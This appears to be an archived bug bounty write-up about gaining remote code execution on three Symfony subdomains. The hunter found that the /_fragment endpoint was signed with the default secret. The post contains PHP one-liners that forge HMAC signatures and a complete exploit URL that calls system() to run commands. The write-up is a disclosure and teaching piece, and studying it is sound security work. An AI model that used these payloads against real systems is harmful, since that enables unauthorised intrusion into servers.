# 3 Symfony (RCE)

- **Source URL:** https://medium.com/@bxrowski0x/3-symfony-rce-a-peek-behind-the-curtain-83da5433e149?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20260714155640/https://medium.com/@bxrowski0x/3-symfony-rce-a-peek-behind-the-curtain-83da5433e149
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/4664 (id 4664)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# 3 Symfony (RCE): A Peek Behind the Curtain

Hi, in this write up I will be sharing my 3 RCE Findings, and simply explain everything.

### Who am I

I’m Omar aka bxrowski0x, I’m a passionate bug hunter I’ve made significant contributions to enhancing the security of the internet by identifying and reporting vulnerabilities to some of the world’s leading companies, I’m excited to share my knowledge and expertise through this write-up, hoping it be a valuable resource for you all.

### How I come across the vulnerability

I was just hunting as usual until I came across a subdomain let’s say

*calculator-test.redacted.com*

It had the default Symfony homepage with debug mode enabled

First when i saw it i started testing for known misconfigurations that could lead to the exposure of sensitive data as example those below:

1. Tried to access Symfony Profiler **(Not Enabled)**
2. Tried to get a phpinfo file **(Didn’t Find It)**
3. Tried To Do a Directory Brute Force **(Didn’t Help)**
4. Since there was debug mode enabled, Tried to force the app and make it return some errors that may contain sensitive information **(Didn’t Work)**
5. Tried to access the **/**\_fragment page **(Enabled)** then tried the ambionics [SCRIPT](https://github.com/ambionics/symfony-exploits) And for some reason it returned some errors and was not able to exploit it **(Didn’t Work)**

So none of them worked.

As this was my first time dealing with Symfony, I did some research on the framework to get a better understanding of it. i found two helpful resources [book.hacktricks.xyz](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/symphony) , [www.ambionics.io](http://web.archive.org/web/20230708081739/https://www.ambionics.io/blog/symfony-secret-fragment) this research has provided me with a good understanding of Symfony and Symfony fragments.

### What I came to understand

- Symfony is a free and open source PHP framework that makes web development faster and easier
- Symfony has a built-in feature it is the /\_fragment which allows clients to provide custom PHP commands and return the HTML output
- Symfony signs /\_fragment requests with a secret key to prevent misuse
- A weak or leaked secret could lead to RCE
- Anyone with the /\_fragment secret key can execute arbitrary PHP code on the server leading to RCE.
- The default secret value might be being used
- The secret value can be leaked through phpinfo -there are several ways-

### **RCE Using the /\_fragment**

**Let me start by saying that**

*“ The /\_fragment endpoint returns a 403 Forbidden status code if a request is made to it without a valid signature. but if a valid signature is provided, the endpoint should return a 404 Not Found status code. ”*

*“ The signature is generated using the HMAC algorithm and a plain text which is the URL and a secret key. The secret key is known only to the server. The request is rejected if the signature does not match the expected value. ”*

Since the ambionics script output was some weird errors i decided to manually check it.

So now we have the *calculator-test.redacted.com* with the **/\_fragment** page enabled. I assumed that the secret key is the default value which is

“ ThisTokenIsNotSoSecretChangeIt “

Here the PHP Code that generated the signature using the secret key

`php -r "echo(urlencode(base64_encode(hash_hmac('sha256', 'https://calculator-test.redacted.com/_fragment', 'ThisTokenIsNotSoSecretChangeIt', 1))) . PHP_EOL);"`
*“ The code generates an HMAC signature for the given URL/Endpoint, secret key, and algorithm. Then encoding the signature using base64 and then URL encoded, The output is used to send requests to the /\_fragment. ”*

Now we gotta validate the hash by sending a request to **/\_fragment** page and using the output as the value of the **\_hash** parameter.

`https://calculator-test.redacted.com/_fragment?_hash=M76MW%2Fbf%2BBsOzND95apIHF%2BW2PD9ofEuBovlI600xpM%3D`
Then opened the URL along with the base64 encoded hash.

Yesssssssssssss responded with a **404 Status Code** which means the key is valid, Let’s make it happen.

To exploit it we need to use the \_path parameter along with the \_controller and the system function and the command we want to execute then using the same steps used before to get a valid signature for the Exploit URL.

`_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull`
*“ It basically sets the \_controller value as the system function then executes the \` id \` command Then we get the signature for the Full URL. “*

Here the PHP Code that generated the signature using the secret key

`php -r "echo(urlencode(base64_encode(hash_hmac('sha256', 'https://calculator-test.redacted.com/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull', 'ThisTokenIsNotSoSecretChangeIt', 1))) . PHP_EOL);"`
Then I opened the URL in my browser.

`https://calculator-test.redacted.com/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=dOpYkmvuht9bBB4i6zeedrbtesvNgfbLaKPpSHky9Hc%3D`
Yessssssssssssssssssssssir

I quickly created a script to get all subdomains that use Symfony and have the **/\_fragment** page enabled.

There was *calculator.redacted.com* and *calculator-dev.redacted.com*

Luckily they shared the same secret value and both was vulnerable to the same RCE, Using the same steps I gained 3 RCEs.

## Timeline

**Dec 6, 2022**— Reported

**Dec 7, 2022**— Need more info

**Dec 8, 2022**— Fixed

**Dec 9, 2022**— Bounty Rewarded

**Stay in touch:**
